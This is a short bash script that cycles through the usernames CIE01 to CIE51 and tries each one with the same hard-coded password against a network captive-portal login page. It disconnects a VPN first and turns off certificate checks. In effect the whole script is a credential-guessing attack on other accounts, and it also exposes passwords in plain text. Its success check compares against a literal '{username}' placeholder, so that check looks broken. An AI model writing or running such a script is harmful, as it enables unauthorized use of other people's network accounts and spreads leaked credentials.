#!/bin/bash

# Get the current hour

# Set the URL and password for CIE login
cie_login_url="https://192.168.254.1:8090/login.xml"

# Set the URL and password for PES1UG19CS login
pes_login_url="https://192.168.254.1:8090/login.xml"
# pes_password="aryan@012"

# Define ANSI color codes
green='\033[0;32m'
yellow='\033[0;33m'
red='\033[0;31m'
cyan='\033[0;36m'
reset='\033[0m' # Reset color
warp-cli disconnect
# Function to perform Warp disconnect

# Function to perform CIE login
cie_login() {
    local username="$1"
    local response=$(curl -k -s -X POST -d "mode=191&username=$username&password="pesu@2020"&a=1713188925839&producttype=0" -H "Content-Type: application/x-www-form-urlencoded" "$cie_login_url")
    local message=$(echo "$response" | grep -oP '(?<=<message>).*?(?=</message>)')

    if [[ "$message" == "<![CDATA[You are signed in as {username}]]>" ]]; then
        echo -e "${green}Successfully connected to $username${reset}"  # Print the username
    else
        echo -e "${yellow}Trying username $username${reset}"
    fi
}
    for username in {1..51}; do
        cie_login "CIE$(printf "%02d" $username)"
    done
warp-cli connect    
